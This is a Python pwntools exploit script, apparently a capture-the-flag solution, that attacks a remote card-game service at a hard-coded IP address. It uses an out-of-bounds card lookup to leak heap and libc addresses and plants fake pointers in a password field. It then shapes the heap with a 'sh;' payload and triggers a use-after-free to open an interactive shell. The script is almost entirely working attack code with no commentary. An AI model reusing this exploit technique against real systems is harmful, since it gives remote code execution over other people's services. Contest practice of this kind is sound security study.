#!/usr/bin/python
from pwn import *

def win_game(r):
    r.recvuntil('> ')
    r.sendline('1')
    for i in xrange(10):
        r.recvuntil('Round ')
        for j in xrange(3):
            r.sendline('50')
            r.recvuntil('!\n')
    r.recvuntil('Game Over!')
    r.recvuntil('> ')
    r.sendline('2')
    for i in xrange(3):
        r.recvuntil('Round ')
        for j in xrange(3):
            r.sendline('50')
            r.recvuntil('!\n')
    r.sendline('50')
    r.sendline('1')
    r.recvuntil('You win!!')

r = remote('110.10.212.140', 5959)

# First player creation
r.recvuntil('ID : ')
r.sendline('a')
r.recvuntil('password : ')
r.sendline('a')
r.recvuntil('password : ')
r.sendline('a')
r.recvuntil('information : ')
r.sendline('a')

# Second player creation
r.recvuntil('> ')
r.sendline('2')
r.recvuntil('ID : ')
r.sendline('b')
r.recvuntil('password : ')
r.sendline('b')
r.recvuntil('password : ')
r.sendline('b')
r.recvuntil('information : ')
r.sendline('b')

# Third player creation & deletion
r.recvuntil('> ')
r.sendline('2')
r.recvuntil('ID : ')
r.sendline('c')
r.recvuntil('password : ')
r.sendline('c')
r.recvuntil('password : ')
r.sendline('c')
r.recvuntil('information : ')
r.sendline('c')
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('delete?')
r.sendline('c')
r.recvuntil('password : ')
r.sendline('c')

# First player login
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('ID : ')
r.sendline('a')
r.recvuntil('password : ')
r.sendline('a')


# Leak
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('Which one do you wanna see? ')
r.sendline('0')
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('Card ID : ')
addr0 = int(r.recvuntil('\n')[:-1], 0)
print hex(addr0)
list_addr = addr0 - 0xa0

r.recvuntil('> ')
r.sendline('3')
r.recvuntil('Which one do you wanna see? ')
libc_ptr_addr = addr0 + 0x1320
print str((libc_ptr_addr - list_addr) / 8)
r.sendline(str((libc_ptr_addr - list_addr) / 8))
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('Card ID : ')
libc_addr = int(r.recvuntil('\n')[:-1], 0)
libc_base = libc_addr - 0x3c3b78
cpp_base = libc_base + 0x5df000
print hex(libc_ptr_addr), hex(libc_addr), hex(libc_base)

r.recvuntil('> ')
r.sendline('3')
r.recvuntil('Which one do you wanna see? ')
pass_ptr_addr = addr0 + 8
print str((pass_ptr_addr - list_addr) / 8)
r.sendline(str((pass_ptr_addr - list_addr) / 8))
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('Card ID : ')
pass_addr = int(r.recvuntil('\n')[:-1], 0)
print hex(pass_addr)

r.recvuntil('> ')
r.sendline('1')
r.recvuntil('Enter new password : ')
r.sendline(p64(pass_addr-8) + p64(libc_base + 0x45390) + p64(cpp_base + 0xb3840) + p64(0) + p64(0) + p64(0) + p64(0) + p64(cpp_base + 0xc81d1))
r.recvuntil('> ')
r.sendline('5')

# Play game vs. computer (and win)
win_game(r)

# Logout
r.recvuntil('> ')
r.sendline('3')
r.sendline('4')

# Delete second player
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('delete?')
r.sendline('b')
r.recvuntil('password : ')
r.sendline('b')

# Try to delete (fails, but layouts heap)
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('delete?')
r.sendline(p64(pass_addr) + p64(cpp_base + 0xbce5f) + 'sh;\0\0\0\0\0' * 5)

pause()

# Trigger UAF
r.recvuntil('> ')
r.sendline('2')

r.interactive()

